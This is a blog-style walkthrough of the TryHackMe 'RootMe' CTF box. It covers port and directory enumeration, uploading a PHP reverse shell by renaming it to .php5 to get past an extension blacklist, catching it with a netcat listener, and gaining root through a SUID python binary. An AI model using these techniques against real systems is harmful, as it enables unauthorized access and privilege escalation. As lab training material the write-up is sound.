## Introduction
RootMe is a basic boot-to-root CTF on TryHackMe.  I figured it would be a nice and easy box to document as I get used to blogging.
The box is available to check out yourself at: [https://tryhackme.com/room/rrootme](https://tryhackme.com/room/rrootme)

## Enumeration
As always, enumeration/recon is the first step of the engagement.  This is infosec after all, information is our game.  The more we have, the more power we hold.
Let's start by finding services with the classic nmap.

### Nmap
I use the nmap with the -A flag (because it's a CTF and I can throw as much traffic as I want at it) to find just about everything. 
I also use the -sV flag as it gives just a little bit more info about the service than -A does.   I then output the scan to the nmap.scan file in the project's directory with the -o flag.  As with "real world" engagements, documenting as you go is a must.  
```
sudo nmap -A -sV 10.10.121.102 -o nmap.scan

As we see here, ports 22 running SSH and 80 running HTTP are open.  I know from previous experience that neither of these version numbers have known vulnerabilities in them (at least, toward getting a shell), so I pass over those.  
The next thing to do is check the website for potential misconfigurations and vulnerable code.  

### Web Enumeration
My go to tool of choice for enumerating websites is GoBuster.  It's like dirb but faster and fancier.  As with nmap, I output the scan to a file (gobuster.scan), but I have to use tee for this one. 
```
sudo gobuster dir -u http://10.10.121.102/ -w /usr/share/wordlists/dirb/big.txt | tee gobuster.scan

Here we find the standard htaccess, css, js, etc. directories, but then we also find /panel, /server-status, and /uploads.  
My initial thought is that if we have some way to upload files on the panel, we can LFI our way to executing a PHP webshell from /uploads.  This will depend of course, on the contents of the panel.  

#### The Panel!
The panel turned out to be exactly what I thought it might be.  It is literally just a file upload page.  Here's what it looks like:
![rootme panel](/images/2022/rootmePanel.png){:class="img-responsive"}

## Exploitation
I think we have enough information to get our shell.  
Before going any farther, I setup a netcat listener with the tried and true `nc -nlvp 9501` for when I got a shell.

I tried to upload the Pentestmonkey PHP webshell (renamed evil.php) but was given a bright red "PHP não é permitido!" message.  Sounds like I'll have to actually _try_ to get the LFI.
![rootme webshell upload1](/images/2022/rootmeUpload1.png){:class="img-responsive"}

Next, I attempted to rename the file to test the upload blacklist.  I tried things like evil.jpeg.php and evil.php.jpeg, but neither of those would run (they would upload though!).  I finally got it by renaming evil.php to evil.php5, where it uploads and we recieve a shell!
![rootme webshell upload2](/images/2022/rootmeUpload2.png){:class="img-responsive"} 
![rootme webshell uploads page](/images/2022/rootmeUploads.png){:class="img-responsive"}
```

$ 
```
When I get a shell, I like to upgrade it with Python to a TTY so I can use sudo and all that other good stuff.  
To do so, I used `python3 -c 'import pty;pty.spawn("/bin/bash")'`.
We are currently www-data, which is a low-privilege account, so let's get to work.
I always check the home directory of my user to see if there are any interesting files there.  So:
```
www-data@rootme:/$ cd ~
cd ~
www-data@rootme:/var/www$ ls
ls
html  user.txt
```
There's the first flag!

## Escalation
The goal in this CTF is to get root on the box.  User is not enough!  
The first thing I like to check is if there are any SUID binaries on the system.
```

```
Using `find` on the root directory will have a lot of permission denied lines, so I piped stderr to /dev/null.
Python is in this list, which is a really big red flag, so I looked up the binariy with [gtfobins](https://gtfobins.github.io/) and found the exploit there. 
```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
```
And there we have it.  The box is rooted.

## Conclusion
This box was pretty easy, with rather standard forms of exploitation.  I did learn a lot about blogging on this platorm though, which was the goal!  Thanks for reading!
